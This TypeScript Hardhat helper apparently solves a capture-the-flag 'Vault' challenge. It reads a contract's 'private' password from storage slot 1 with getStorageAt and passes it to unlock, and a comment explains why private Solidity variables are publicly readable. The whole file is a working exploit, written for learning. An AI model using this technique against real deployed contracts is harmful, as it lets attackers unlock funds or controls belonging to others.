import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    'Private' storage variables only stop other contracts from reading it.
    However, all blockchain data is public. 

    Smart contract storage variables are stored in "slots" of 32 bytes
    It packs adjacent values together if they fit in 32 bytes.
    
    Vault has 2 storage vars, 'locked' & 'password'.
    Locked is a bool and takes up 1 byte
    password is a 'bytes32' so takes up 32 bytes.

    Therefore, we need to target slot 1 to get the pw.

  */
  const password = ethers.provider.getStorageAt(victim.address, 1);
  await victim.unlock(password);
};

export default helper;
